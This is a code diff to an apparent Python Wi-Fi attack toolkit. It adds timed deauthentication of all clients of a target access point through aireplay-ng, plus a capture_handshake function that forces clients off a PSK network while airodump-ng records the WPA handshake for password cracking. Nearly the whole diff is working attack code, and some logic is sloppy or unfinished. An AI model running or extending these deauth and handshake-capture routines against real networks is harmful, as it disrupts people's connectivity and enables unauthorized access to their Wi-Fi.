@@ -4,7 +4,7 @@ import subprocess
 import time
 import re
 import keyboard
-
+import glob
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 
 
@@ -283,8 +283,7 @@ def get_BSSID_and_Station_from_AP(interface, targetAP):
                 return targetAP_BSSID, targetAP_channel
     return
 
-
-def Deauth(interface, targetAP, interval=False):
+def Deauth(interface, targetAP, interval=0, timeLimit=0):
     """
     CALLS:
         : get_BSSID_and_Station_from_AP :
@@ -293,10 +292,21 @@ def Deauth(interface, targetAP, interval=False):
     CALLED BY: main.py
 
 
-    :param interface:
+    :param interface: Wi-Fi interface used in aircrack
+    :type interface: string
     :param targetAP:
-    :param interval: by default aireplay runs until user closes it. if interval == true then it will run for 60 seconds then quit
-        this option is needed for functions that loop multiple SSIDs in order to Deauth them all (for example : Deauth_By_OUI)
+
+
+    :param interval: by default aireplay runs until user closes it. if interval != 0 then it will run for interval seconds then quit
+    this option is needed for functions that loop multiple SSIDs in order to Deauth them all (for example : Deauth_By_OUI)
+    for example if interval == 30. and 2 SSID exist and user wants to deauth both and quit each SSID will be deauthed for 30 seconds
+    :type interval: integer
+
+    :param timeLimit: by default aireplay runs until user closes it. or if interval time is up. but for limiting the
+    Deauthentication from infinite to a limited time for a single SSID, this parameter is used
+    for example if user gives DEAUTH(interface,targetAP,timeLimit=15) the deauth will run for 15 seconds
+
+    :type timeLimit: integer
     :return:
     """
     try:
@@ -306,11 +316,12 @@ def Deauth(interface, targetAP, interval=False):
         switch_channel.wait()
 
         if interval:  # if another function wants to run deauth attack but for a limited time
+            # if its 0 then it means false
             for terminal in terminals:  # run aireplay in separate terminal
                 clear()
                 aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
-                                            shell=True)
-                interval_time = 60
+                                            shell=True,preexec_fn=os.setsid)
+                interval_time = interval
                 while interval_time > 0:
                     print(
                         f"Deauthenticating {ansi_escape_green(targetAP)}. Remaining time {ansi_escape_green(interval_time)} Press Q repeatedly to cancel")
@@ -326,6 +337,20 @@ def Deauth(interface, targetAP, interval=False):
                 except ProcessLookupError:  # sometimes aireplay gets killed randomly with this try catch once we get an error while trying to kill a process that's already killed the script will still continue to run
                     print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {ansi_escape_red(ProcessLookupError)}")
                 return
+
+        elif timeLimit: # if time limit is given then run airodump and terminate after timeLimit ends
+            for terminal in terminals:
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
+                                            shell=True,preexec_fn=os.setsid)
+                time.sleep(timeLimit)
+                try:
+                    os.killpg(aireplay.pid, signal.SIGTERM)  # kill the aireplay and return after 60 seconds
+                    aireplay.wait()
+
+                except ProcessLookupError:  # sometimes aireplay gets killed randomly with this try catch once we get an error while trying to kill a process that's already killed the script will still continue to run
+                    print(f"This error occurs when airodump terminates unexpectedly {ansi_escape_red(ProcessLookupError)}")
+                return
+
         else:
             for terminal in terminals:
                 aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
@@ -682,3 +707,166 @@ def deauth_devices_in_targetAP(interface, targetAP):
         print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
         input(f'input anything to return to previous function \n')
         return
+
+
+def get_SSIDs_with_PSK_authentication_from_output(output):
+    """
+    can only be used with the output variable returned from get_airodump_output()
+    :param output: variable returned from get_airodump_output()
+    :return: list of SSIDs where authentication is 'PSK'
+    """
+    output = output_ansi_management(output)
+    authentications = []
+    for column in output.split('\n'):
+        row = column.split()
+        ''' AT THIS POINT the Data is formatted like this                                                                                                                
+         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
+         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
+         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
+         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
+                                                                            
+        '''
+        if len(row) >= 12  and row[-3] == ('PSK' or 'psk'):
+            authentications.append(row[-2])
+    return authentications
+
+def get_bssid_channel_from_airodump_output(output):
+    output = output_ansi_management(output)
+    for row in output.split('\n'):
+        column = row.split()
+
+
+        # if len(column) >= 12 and (targetAP == column[10]) and ((column[0] and column[5]) != ''):
+        #     targetAP_BSSID = column[0]
+        #     targetAP_channel = column[5]
+        #     print(
+        #         f' Target BSSID {ansi_escape_green(targetAP_BSSID)} \n CHANNEL {ansi_escape_green(targetAP_channel)}  \n AP {ansi_escape_green(targetAP)} \n \n Listing '
+        #         f'Devices in this AP Please Wait')
+        #     return targetAP_BSSID, targetAP_channel
+
+
+def remove_files_with_prefix(directory, prefix):
+    # Construct the search pattern
+    pattern = os.path.join(directory, prefix + '*')
+
+    # Find all files in the specified directory that match the pattern
+    files_to_remove = glob.glob(pattern)
+
+    # Remove each file
+    for file_path in files_to_remove:
+        try:
+            os.remove(file_path)
+            print(f"Removed {file_path}")
+        except FileNotFoundError:
+            print(f"File {file_path} was not found (it may have been removed already).")
+        except Exception as e:
+            print(f"Error removing {file_path}: {e}")
+    return
+def capture_handshake(interface, target_ap):
+    """
+    https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+
+    :param interface:
+    :param target_ap:
+    :return:
+    """
+    # capturing the handshake is done in order to crack the password of the Wi-Fi,
+    # but it only works for 'psk' authentication, so we need to check if first
+    output = get_airodump_output(interface)
+    if output is None:
+        # print(repr(output))
+        print(
+            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
+        print(
+            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("output_ansi_management")}')
+        print(
+            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code and check the ansi escape output and check if a start/end pattern exist in  {ansi_escape_red("output_ansi_management")}')
+        print(f'and contact me on {ansi_escape_green("github")}')
+        input(f'input anything to return to previous function \n')
+        return
+
+    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
+        authentications = get_SSIDs_with_PSK_authentication_from_output(output)
+        if target_ap in authentications:
+            BSSID, CHANNEL = get_BSSID_and_Station_from_AP(interface, target_ap)
+            for terminal in terminals:  # run aireplay in separate terminal
+                clear()
+                print(f'Running package capture on {ansi_escape_green(target_ap)}')
+                print(f'Switching channel on new terminal {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
+                switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
+                switch_channel.wait()
+                print(f'Running aireplay on f{ansi_escape_green(target_ap)}')
+
+                print(f'Running airodump on this terminal {ansi_escape_green(target_ap)}')
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {BSSID} {interface}',shell=True,preexec_fn=os.setsid)
+                airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {target_ap} {interface}',shell=True,preexec_fn=os.setsid,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+                # time.sleep(5) # now we wait 10 seconds for aireplay to deauthenticate the target AP
+                # if we run airodump and aireplay continuously then devices may never be able to reconnect and if they dont try to reconnect we wont get the handshake
+                timeout = 20 # usually enough to get the handshake. but if you are unable to get the handshake set sleep to 30 or 60 seconds
+                time.sleep(30)
+                os.killpg(airodump.pid, signal.SIGTERM)
+
+                airodump_output,error = airodump.communicate()
+                airodump_output = airodump_output.decode(encoding='latin-1')
+                print(repr(airodump_output))
+
+                print(airodump_output)
+                try:
+
+
+
+                    airodump.wait()
+                except ProcessLookupError:
+                    print('airodump killed unexpectedly', ProcessLookupError)
+
+
+                try:
+                    os.killpg(aireplay.pid, signal.SIGTERM)
+                    aireplay.wait()
+                except ProcessLookupError:
+                    print('aireplay killed unexpectedly', ProcessLookupError)
+
+                # Regular expression pattern to search for 'handshake:' possibly surrounded by ANSI escape codes
+                pattern = re.compile(r'handshake:')
+
+                # Search using the regular expression
+                match = pattern.search(airodump_output)
+                if match:
+                    print(f"\nHandshake capture {ansi_escape_green('SUCCESSFUL')}")
+                    print(f"Handshake is saved in ")
+
+                else:
+                    print(f'Handshake capture {ansi_escape_red("FAILED")}')
+                    print('Remember that in order to capture the handshake a device must try to connect to the target SSID')
+                    print('Reason for no handshake might be that no device was deauthenticated. Try changing the timeout variable of this script in the source code')
+                    print('Or it might be that the deauthenticated devices did not try to reconnect to the SSID (might happen if only a small amount of devices are connected to target SSID)')
+
+                    remove_files_with_prefix('/tmp', f'{target_ap}')
+                    while 1:
+                        selection = input('\n Do you want to try again Y/N').lower()
+                        if selection == 'y':
+                            capture_handshake(interface,target_ap)
+                        if selection == 'n':
+                            return
+                    return
+
+        else:
+            print(authentications)
+            print(f'{ansi_escape_green(target_ap)} is not authenticated with  with {ansi_escape_green("PSK")} it was not in the list provided by {ansi_escape_green("get_authentication_from_airodump_output")} ')
+            print(f'Here is the list of other SSIDs where the authentication is {ansi_escape_green("PSK")}')
+            print("\n=======================================================================================\n")
+            for ap in authentications:
+                print(ansi_escape_green(ap))
+            print("\n=======================================================================================\n")
+            input(f"Press enter to return to Network attacks menu. and select any other network from the list above they all use {ansi_escape_green('PSK')}")
+            return
+
+    else:
+        print('==================================================================================================\n')
+        print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
+        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
+        input(f'input anything to return to previous function \n')
+        return
+
+
